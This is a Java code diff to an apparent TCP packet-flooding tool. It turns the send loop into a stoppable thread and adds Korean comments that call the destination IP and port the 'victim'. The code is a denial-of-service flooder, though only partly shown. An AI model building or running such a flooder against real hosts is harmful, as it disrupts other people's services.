@@ -6,6 +6,8 @@ import java.net.SocketException;
 import java.net.UnknownHostException;
 import java.util.HashMap;
 
+import javax.xml.stream.events.StartDocument;
+
 import PF_GUI.PF_GUI_NICList;
 import PF_GUI.PF_GUI_Resource;
 import jpcap.JpcapSender;
@@ -23,7 +25,7 @@ import jpcap.packet.TCPPacket;
  * 
  */
 
-public class PF_SendTCP {
+public class PF_SendTCP implements Runnable {
 
 	/** NIC **/
 	private jpcap.NetworkInterface m_dev;
@@ -77,6 +79,9 @@ public class PF_SendTCP {
 	 * @throws UnknownHostException 
 	 * @throws NumberFormatException 
 	 * @throws SocketException 
+	 * @param ip 수신지(피해자) IP Address
+	 * @param port 수신지(피해자) Port Number
+	 * @param speed 초당 전송할 패킷의 양
 	 */
 	public boolean set_PF_SendTCP(String ip, String port, int speed) throws NumberFormatException, UnknownHostException, SocketException 
 	{
@@ -129,12 +134,6 @@ public class PF_SendTCP {
 			// 초당 전송할 패킷의 양을 설정
 			m_pktsNum = speed;
 			
-			// 패킷 전송
-			try {
-				send();
-			} catch (IOException e) {
-				e.printStackTrace();
-			}
 			
 			return true;
 		}
@@ -147,14 +146,18 @@ public class PF_SendTCP {
 	
 	
 	/**
-	 * TCP Packet을 생성하여 전송하는 메소드
-	 * @param nic 사용자에 의해 선택된 Device NPF 정보
-	 * @throws IOException 
+	 * 스레드를 이용하여 TCP Packet을 생성하여 전송하는 메소드
 	 */
-	public void send() throws IOException {
+	@Override
+	public void run() {
 		
 		// 패킷 전송 객체 생성
-		JpcapSender sender = JpcapSender.openDevice(m_dev);
+		JpcapSender sender = null;
+		try {
+			sender = JpcapSender.openDevice(m_dev);
+		} catch (IOException e) {
+			e.printStackTrace();
+		}
 		
 		/*
 		 * 
@@ -223,7 +226,7 @@ public class PF_SendTCP {
 		/*
 		 * 패킷을 전송하는 loop
 		 */
-		for(int i=0; i<m_pktsNum; i++)
+		for (int i=0; i<m_pktsNum; i++)
 		{
 			// 패킷 전송
 			sender.sendPacket(packet);
@@ -231,9 +234,17 @@ public class PF_SendTCP {
 			// 전송에 성공한 누적 패킷 수 실시간 출력
 			PF_GUI_Resource.get_Instance().m_lbl_sendPackets.setText(String.valueOf(++m_pktsCount));
 		
-			// ...
+			// Stop 버튼을 클릭하여 interrupt 메소드를 호출하였을 경우
+			if (Thread.currentThread().isInterrupted()) {
+				// 패킷 전송을 정지함
+				break;
+			}
 		}
 		
+		// 패킷 전송이 완료된 경우 - 시작 버튼 활성화 : 정비 버튼 비활성화
+		PF_GUI_Resource.get_Instance().m_btn_flooder_Start.setEnabled(true);
+		PF_GUI_Resource.get_Instance().m_btn_flooder_Stop.setEnabled(false);
+	
 	}
 
 
